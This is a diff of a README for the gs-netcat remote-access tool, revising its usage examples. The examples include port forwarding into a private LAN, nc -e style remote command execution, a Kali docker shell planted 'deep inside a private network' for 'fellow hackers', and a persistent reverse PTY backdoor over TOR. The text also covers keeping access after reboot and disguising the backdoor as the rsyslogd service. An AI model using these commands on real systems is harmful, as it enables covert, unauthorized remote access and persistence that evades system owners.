@@ -124,13 +124,18 @@ $ gs-netcat <warez.tar.gz          # Workstation B
 ```
 
 6. Port forward. *Workstation B's* Port 2222 is forwarded to 192.168.6.7 on *Workstation A's* private LAN
+
+On Workstation A execute:
 ```
-$ gs-netcat -l -d 192.168.6.7 -p 22 # Workstation A
-$ gs-netcat -p 2222                 # Workstation B
-$ ssh -p 2222 root@127.0.0.1        # Will ssh to 192.168.6.7:22 on Host's private LAN
-...or...
-$ gs-netcat -s MySecret -l -d 192.168.6.7 -p 22                   # Workstation A
-$ ssh -o ProxyCommand='gs-netcat -s MySecret' root@doesnotmatter  # Workstation B
+gs-netcat -l -d 192.168.6.7 -p 22
+```
+On Workstation B execute:
+```
+gs-netcat -p 2222
+```
+In a new terminal on Workstation B execute:
+```
+ssh -p 2222 root@127.0.0.1        # Will ssh to 192.168.6.7:22 on Host's private LAN
 ```
 
 7. Execute any command (nc -e style) on *Workstation A*
@@ -138,6 +143,19 @@ $ ssh -o ProxyCommand='gs-netcat -s MySecret' root@doesnotmatter  # Workstation 
 $ gs-netcat -l -e "echo hello world; id; exit"   # Workstation A
 $ gs-netcat                                      # Workstation B
 ```
+
+Another example: Spawn a new docker environment deep inside a private network
+```
+# Start this on a host deep inside a private network
+gs-netcat -il -d "docker run --rm -it kalilinux/kali-rolling"
+```
+
+Access the docker environment deep inside the private network from anywhere in the world:
+```
+gs-netcat -i
+```
+
+This is particularly useful to allow fellow hackers to access a private network without having to give them access to the system itself.
 
 8. Quick Secure Chat with a friend
 ```
@@ -156,6 +174,7 @@ $ curl --socks4a 127.1:1080 http://www.google.com
 Access fileserver.local:22 on Workstation A's private LAN from your Workstation B:
 $ socat -  "SOCKS4a:127.1:fileserver.local:22"
 ```
+
 
 10. Persistant, daemonized and auto-respawn/watchdog reverse PTY backdoor via TOR
 ```
@@ -215,7 +234,19 @@ $ ps alxww | grep -bash
   1001 47255     1   0  26  5  4281168    436 -      SNs    ??    0:00.00 -bash
 ```
 
-5. Start backdoor after reboot
+5. SSH login to remote workstation
+```
+# On the remote workstation execute:
+gs-netcat -s MySecret -l -d 192.168.6.7 -p 22
+```
+```
+# Access 192.168.6.7 via ssh on the remote network from your workstation:
+ssh -o ProxyCommand='gs-netcat -s MySecret' root@doesnotmatter
+```
+
+6. Retain access after reboot
+
+The easiest way to retain access to a remote system is to use [the automated deploy script](https://www.gsocket.io/deploy). Alternatively the following tricks can be used to achieve the same:
 
 Combine what you have learned so far and make your backdoor restart after reboot (and as a hidden service obfuscated as *rsyslogd*). Use any of the start-up scripts, such as */etc/rc.local*:
 ```
